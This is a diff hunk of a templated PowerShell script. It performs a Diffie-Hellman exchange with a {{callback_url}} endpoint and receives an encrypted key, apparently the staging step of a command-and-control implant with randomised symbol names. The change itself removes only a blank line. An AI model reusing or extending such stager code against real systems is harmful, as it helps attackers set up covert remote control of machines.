@@ -7,7 +7,6 @@ $Client_Public = [bigint]::ModPow($DH_G, $Client_Secret, $DH_N);
 
 $response = ${{symbol_name('webclient')}}.DownloadString("{{callback_url}}$endpoint/$Client_Public").Split();
 
-
 $Server_Public = [bigint]($response[0]);
 $encrypted_key = [System.Convert]::FromBase64String($response[1]);
 
